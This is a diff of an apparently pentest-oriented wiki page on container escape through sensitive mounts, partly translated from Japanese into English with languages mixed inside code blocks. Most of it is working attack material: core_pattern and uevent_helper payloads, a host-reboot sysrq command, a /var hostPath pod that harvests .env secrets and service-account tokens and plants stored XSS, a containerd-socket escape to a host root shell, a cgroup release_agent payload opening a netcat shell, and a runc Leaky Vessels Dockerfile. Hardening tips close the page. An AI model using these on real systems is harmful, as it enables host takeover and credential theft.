@@ -10,7 +10,7 @@
 
 ### `/proc/sys`
 
-このディレクトリは、通常`sysctl(2)`を介してカーネル変数を変更するためのアクセスを許可し、いくつかの懸念されるサブディレクトリを含んでいます：
+このディレクトリは、通常`sysctl(2)`を介してカーネル変数を変更するためのアクセスを許可し、いくつかの懸念されるサブディレクトリを含んでいます。
 
 #### **`/proc/sys/kernel/core_pattern`**
 
@@ -18,7 +18,7 @@
 - このファイルに書き込むことができる場合、パイプ`|`の後にプログラムまたはスクリプトのパスを書き込むことが可能で、クラッシュが発生した後に実行されます。
 - 攻撃者は、`mount`を実行してホスト内のコンテナへのパスを見つけ、そのパスをコンテナのファイルシステム内のバイナリに書き込むことができます。その後、プログラムをクラッシュさせてカーネルがコンテナの外でバイナリを実行するようにします。
 
-- **テストと悪用の例**：
+- **テストと悪用の例**:
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
 cd /proc/sys/kernel
@@ -39,8 +39,8 @@ return 0;
 ```
 #### **`/proc/sys/kernel/modprobe`**
 
-- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で詳細が説明されています。
-- カーネルモジュールをロードするために呼び出されるカーネルモジュールローダーへのパスを含みます。
+- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で詳述されています。
+- カーネルモジュールローダーへのパスを含み、カーネルモジュールをロードするために呼び出されます。
 - **アクセス確認の例**:
 
 ```bash
@@ -55,11 +55,11 @@ ls -l $(cat /proc/sys/kernel/modprobe) # modprobeへのアクセスを確認
 #### **`/proc/sys/fs`**
 
 - [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)に従い、ファイルシステムに関するオプションと情報を含みます。
-- 書き込みアクセスは、ホストに対するさまざまなサービス拒否攻撃を可能にします。
+- 書き込みアクセスはホストに対するさまざまなサービス拒否攻撃を可能にします。
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- マジックナンバーに基づいて非ネイティブバイナリフォーマットのインタープリターを登録できます。
+- マジックナンバーに基づいて非ネイティブバイナリ形式のインタープリターを登録することを許可します。
 - `/proc/sys/fs/binfmt_misc/register`が書き込み可能な場合、特権昇格やルートシェルアクセスにつながる可能性があります。
 - 関連するエクスプロイトと説明:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
@@ -74,7 +74,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # modprobeへのアクセスを確認
 
 #### **`/proc/sysrq-trigger`**
 
-- Sysrqコマンドを呼び出すことができ、即座にシステム再起動やその他の重要なアクションを引き起こす可能性があります。
+- Sysrqコマンドを呼び出すことを許可し、即座にシステム再起動やその他の重要なアクションを引き起こす可能性があります。
 - **ホスト再起動の例**:
 
 ```bash
@@ -91,30 +91,30 @@ echo b > /proc/sysrq-trigger # ホストを再起動
 - カーネルがエクスポートしたシンボルとそのアドレスをリストします。
 - KASLRを克服するためのカーネルエクスプロイト開発に不可欠です。
 - アドレス情報は、`kptr_restrict`が`1`または`2`に設定されている場合に制限されます。
-- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で詳細。
+- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)での詳細。
 
 #### **`/proc/[pid]/mem`**
 
 - カーネルメモリデバイス`/dev/mem`とインターフェースします。
 - 歴史的に特権昇格攻撃に対して脆弱です。
-- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で詳細。
+- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)での詳細。
 
 #### **`/proc/kcore`**
 
 - システムの物理メモリをELFコア形式で表します。
 - 読み取りはホストシステムや他のコンテナのメモリ内容を漏洩させる可能性があります。
 - 大きなファイルサイズは読み取りの問題やソフトウェアのクラッシュを引き起こす可能性があります。
-- [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)で詳細な使用法。
+- [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)での詳細な使用法。
 
 #### **`/proc/kmem`**
 
 - カーネル仮想メモリを表す`/dev/kmem`の代替インターフェースです。
-- 読み取りと書き込みが可能で、カーネルメモリの直接変更を許可します。
+- 読み取りと書き込みを許可し、したがってカーネルメモリの直接変更が可能です。
 
 #### **`/proc/mem`**
 
 - 物理メモリを表す`/dev/mem`の代替インターフェースです。
-- 読み取りと書き込みが可能で、すべてのメモリの変更には仮想アドレスから物理アドレスへの解決が必要です。
+- 読み取りと書き込みを許可し、すべてのメモリの変更には仮想アドレスから物理アドレスへの解決が必要です。
 
 #### **`/proc/sched_debug`**
 
@@ -131,83 +131,89 @@ echo b > /proc/sysrq-trigger # ホストを再起動
 #### **`/sys/kernel/uevent_helper`**
 
 - カーネルデバイス`uevents`を処理するために使用されます。
-- `/sys/kernel/uevent_helper`に書き込むことで、`uevent`トリガー時に任意のスクリプトを実行できます。
-- **エクスプロイトの例**: %%%bash
+- `/sys/kernel/uevent_helper`への書き込みは、`uevent`トリガー時に任意のスクリプトを実行する可能性があります。
+- **エクスプロイトの例**:
+```bash
 
-#### ペイロードを作成
+#### Creates a payload
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-#### コンテナのOverlayFSマウントからホストパスを見つける
+#### Finds host path from OverlayFS mount for container
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-#### 悪意のあるヘルパーにuevent_helperを設定
+#### Sets uevent_helper to malicious helper
 
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
-#### ueventをトリガー
+#### Triggers a uevent
 
 echo change > /sys/class/mem/null/uevent
 
-#### 出力を読み取る
+#### Reads the output
 
-cat /output %%%
+cat /output
+```
 
 #### **`/sys/class/thermal`**
 
-- 温度設定を制御し、DoS攻撃や物理的損傷を引き起こす可能性があります。
+- Controls temperature settings, potentially causing DoS attacks or physical damage.
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-- カーネルアドレスを漏洩させ、KASLRを危険にさらす可能性があります。
+- Leaks kernel addresses, potentially compromising KASLR.
 
 #### **`/sys/kernel/security`**
 
-- `securityfs`インターフェースを持ち、AppArmorなどのLinuxセキュリティモジュールの設定を許可します。
-- アクセスにより、コンテナがそのMACシステムを無効にすることができるかもしれません。
+- Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
+- Access might enable a container to disable its MAC system.
 
-#### **`/sys/firmware/efi/vars` と `/sys/firmware/efi/efivars`**
+#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**
 
-- NVRAM内のEFI変数と対話するためのインターフェースを公開します。
-- 誤設定や悪用により、ラップトップがブリックされたり、ホストマシンが起動不能になる可能性があります。
+- Exposes interfaces for interacting with EFI variables in NVRAM.
+- Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs`はカーネルへの「ルールなし」のデバッグインターフェースを提供します。
-- 制限のない性質のため、セキュリティ問題の歴史があります。
+- `debugfs` offers a "no rules" debugging interface to the kernel.
+- History of security issues due to its unrestricted nature.
 
-### `/var`の脆弱性
+### `/var` Vulnerabilities
 
-ホストの**/var**フォルダーには、コンテナランタイムソケットとコンテナのファイルシステムが含まれています。
-このフォルダーがコンテナ内にマウントされている場合、そのコンテナは他のコンテナのファイルシステムに対してルート権限で読み書きアクセスを得ます。
-これを悪用してコンテナ間をピボットしたり、サービス拒否を引き起こしたり、他のコンテナやそれらで実行されるアプリケーションにバックドアを仕掛けることができます。
+The host's **/var** folder contains container runtime sockets and the containers' filesystems.
+If this folder is mounted inside a container, that container will get read-write access to other containers' file systems
+with root privileges. This can be abused to pivot between containers, to cause a denial of service, or to backdoor other
+containers and applications that run in them.
 
 #### Kubernetes
 
-このようなコンテナがKubernetesでデプロイされると:
+If a container like this is deployed with Kubernetes:
+
 ```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-name: pod-mounts-var
-labels:
-app: pentest
-spec:
-containers:
-- name: pod-mounts-var-folder
-image: alpine
-volumeMounts:
-- mountPath: /host-var
-name: noderoot
-command: [ "/bin/sh", "-c", "--" ]
-args: [ "while true; do sleep 30; done;" ]
-volumes:
-- name: noderoot
-hostPath:
-path: /var
+apiVersion: v1  
+kind: Pod  
+metadata:  
+  name: pod-mounts-var  
+  labels:  
+    app: pentest  
+spec:  
+  containers:  
+  - name: pod-mounts-var-folder  
+    image: alpine  
+    volumeMounts:  
+    - mountPath: /host-var  
+      name: noderoot  
+    command: [ "/bin/sh", "-c", "--" ]  
+    args: [ "while true; do sleep 30; done;" ]  
+  volumes:  
+  - name: noderoot  
+    hostPath:  
+      path: /var
 ```
-**pod-mounts-var-folder** コンテナ内:
+
+Inside the **pod-mounts-var-folder** container:
+
 ```bash
 / # find /host-var/ -type f -iname '*.env*' 2>/dev/null
 
@@ -225,20 +231,22 @@ REFRESH_TOKEN_SECRET=14<SNIP>ea
 /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
 /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html
 
-/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
-are/nginx/html/index2.html
+/ # echo '<!DOCTYPE html><html lang="ja"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index2.html
 ```
-XSSは次のように達成されました：
 
-![マウントされた /var フォルダーを介した保存された XSS](/images/stored-xss-via-mounted-var-folder.png)
+The XSS was achieved:
 
-コンテナは再起動やその他の操作を必要としないことに注意してください。マウントされた **/var** フォルダーを介して行われた変更は即座に適用されます。
+![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)
 
-構成ファイル、バイナリ、サービス、アプリケーションファイル、およびシェルプロファイルを置き換えることで、自動（または半自動）RCEを達成することもできます。
+Note that the container DOES NOT require a restart or anything. Any changes made via the mounted **/var** folder will be applied instantly.
 
-##### クラウド資格情報へのアクセス
+You can also replace configuration files, binaries, services, application files, and shell profiles to achieve automatic (or semi-automatic) RCE.
 
-コンテナはK8sサービスアカウントトークンまたはAWSウェブアイデンティティトークンを読み取ることができ、これによりコンテナはK8sまたはクラウドへの不正アクセスを得ることができます。
+##### Access to cloud credentials
+
+The container can read K8s serviceaccount tokens or AWS webidentity tokens
+which allows the container to gain unauthorized access to K8s or cloud:
+
 ```bash
 / # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
 /host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
@@ -247,32 +255,100 @@ XSSは次のように達成されました：
 /host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
 /host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
 ```
+
 #### Docker
 
-Docker（またはDocker Composeデプロイメント）でのエクスプロイトは全く同じですが、通常、他のコンテナのファイルシステムは異なるベースパスの下で利用可能です：
+The exploitation in Docker (or in Docker Compose deployments) is exactly the same, except that usually
+the other containers' filesystems are available under a different base path:
+
 ```bash
 $ docker info | grep -i 'docker root\|storage driver'
-Storage Driver: overlay2
-Docker Root Dir: /var/lib/docker
+ストレージドライバー: overlay2
+Dockerルートディレクトリ: /var/lib/docker
 ```
-ファイルシステムは `/var/lib/docker/overlay2/` の下にあります:
+
+So the filesystems are under `/var/lib/docker/overlay2/`:
+
 ```bash
 $ sudo ls -la /var/lib/docker/overlay2
 
-drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
-drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
-drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
-drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
+drwx--x---  4 root root  4096 1月  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d  
+drwx--x---  4 root root  4096 1月 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496  
+drwx--x---  4 root root  4096 1月  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f  
+drwx--x---  4 root root  4096 1月  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2  
 <SNIP>
 ```
-#### 注意
 
-実際のパスは異なるセットアップによって異なる場合があるため、他のコンテナのファイルシステムやSA / ウェブアイデンティティトークンを見つけるには、**find**コマンドを使用するのが最善です。
+#### Note
+
+The actual paths may differ in different setups, which is why your best bet is to use the **find** command to
+locate the other containers' filesystems and SA / web identity tokens
 
 
 
-### 参考文献
+### Other Sensitive Host Sockets and Directories (2023-2025)
 
+Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent to giving the container full root on the node. **Treat the following paths as highly sensitive and never expose them to untrusted workloads**:
+
+```text
+/run/containerd/containerd.sock     # containerd CRI ソケット  
+/var/run/crio/crio.sock             # CRI-O ランタイムソケット  
+/run/podman/podman.sock             # Podman API (rootful または rootless)  
+/var/run/kubelet.sock               # Kubernetes ノード上の Kubelet API  
+/run/firecracker-containerd.sock    # Kata / Firecracker
+```
+
+Attack example abusing a mounted **containerd** socket:
+
+```bash
+# コンテナ内（ソケットは /host/run/containerd.sock にマウントされています）
+ctr --address /host/run/containerd.sock images pull docker.io/library/busybox:latest
+ctr --address /host/run/containerd.sock run --tty --privileged --mount \
+type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
+chroot /host /bin/bash   # ホスト上でのフルルートシェル
+```
+
+A similar technique works with **crictl**, **podman** or the **kubelet** API once their respective sockets are exposed.
+
+Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:
+
+```bash
+# assuming the container has CAP_SYS_ADMIN and a vulnerable kernel
+mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
+
+echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # requires CVE-2022-0492
+
+echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
+sh -c "echo 0 > /tmp/x/cgroup.procs"  # triggers the empty-cgroup event
+```
+
+When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.
+
+### Mount-Related Escape CVEs (2023-2025)
+
+* **CVE-2024-21626 – runc “Leaky Vessels” file-descriptor leak**
+runc ≤1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥25.0.3, containerd ≥1.7.14).
+
+```Dockerfile
+FROM scratch
+WORKDIR /proc/self/fd/4   # 4 == "/" on the host leaked by the runtime
+CMD ["/bin/sh"]
+```
+
+* **CVE-2024-23651 / 23653 – BuildKit OverlayFS copy-up TOCTOU**
+A race condition in the BuildKit snapshotter let an attacker replace a file that was about to be *copy-up* into the container’s rootfs with a symlink to an arbitrary path on the host, gaining write access outside the build context. Fixed in BuildKit v0.12.5 / Buildx 0.12.0. Exploitation requires an untrusted `docker build` on a vulnerable daemon.
+
+### Hardening Reminders (2025)
+
+1. Bind-mount host paths **read-only** whenever possible and add `nosuid,nodev,noexec` mount options.
+2. Prefer dedicated side-car proxies or rootless clients instead of exposing the runtime socket directly.
+3. Keep the container runtime up-to-date (runc ≥1.1.12, BuildKit ≥0.12.5, containerd ≥1.7.14).
+4. In Kubernetes, use `securityContext.readOnlyRootFilesystem: true`, the *restricted* PodSecurity profile and avoid `hostPath` volumes pointing to the paths listed above.
+
+### References
+
+- [runc CVE-2024-21626 advisory](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
+- [Unit 42 analysis of CVE-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
 - [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
 - [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
